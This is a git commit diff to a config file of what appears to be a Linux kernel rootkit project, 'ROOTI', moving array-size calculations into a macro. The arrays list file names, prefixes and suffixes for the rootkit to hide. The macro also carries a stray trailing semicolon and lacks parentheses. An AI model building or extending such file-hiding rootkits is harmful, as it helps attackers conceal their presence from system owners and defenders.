2a64ce0172cff1d5a8c67e2bfd4c9b5431ea5d5a
Omri Ben Zikri <omribenzikri10@gmail.com>
2025-07-05 13:50:43 +0000

    Extraced calculation of array size into a macro

--- src/config.c
+++ src/config.c
@@ -1,23 +1,26 @@
-#include <linux/array_size.h>
 #include "config.h"
+
+/*
+    Unfortunately the linux kernel ARRAY_SIZE macro cannot be used to assign the result of the calculation
+    to a constant variable because the linux macro includes some magic __must_be_array() term to catch invalid use
+    of the macro, thus making the expression not constant.
+*/
+#define ROOTI_CONST_ARRAY_SIZE(arr) sizeof(arr) / sizeof(arr[0]);
 
 const char *ROOTI_HIDDEN_FILES[] = {
     "hideme.txt",
     "dontshowme.txt"
 };
-const size_t ROOTI_HIDDEN_FILES_COUNT = sizeof(ROOTI_HIDDEN_FILES) /
-                                        sizeof(ROOTI_HIDDEN_FILES[0]);
+const size_t ROOTI_HIDDEN_FILES_COUNT = ROOTI_CONST_ARRAY_SIZE(ROOTI_HIDDEN_FILES);
 
 const char *ROOTI_HIDDEN_FILES_PREFIXES[] = {
     "secret",
     "classified"
 };
-const size_t ROOTI_HIDDEN_FILES_PREFIXES_COUNT = sizeof(ROOTI_HIDDEN_FILES_PREFIXES) /
-                                                 sizeof(ROOTI_HIDDEN_FILES_PREFIXES[0]);
+const size_t ROOTI_HIDDEN_FILES_PREFIXES_COUNT = ROOTI_CONST_ARRAY_SIZE(ROOTI_HIDDEN_FILES_PREFIXES);
 
 const char *ROOTI_HIDDEN_FILES_SUFFIXES[] = {
     "secret",
     "classified"
 };
-const size_t ROOTI_HIDDEN_FILES_SUFFIXES_COUNT = sizeof(ROOTI_HIDDEN_FILES_SUFFIXES) /
-                                                 sizeof(ROOTI_HIDDEN_FILES_SUFFIXES[0]);
+const size_t ROOTI_HIDDEN_FILES_SUFFIXES_COUNT = ROOTI_CONST_ARRAY_SIZE(ROOTI_HIDDEN_FILES_SUFFIXES);
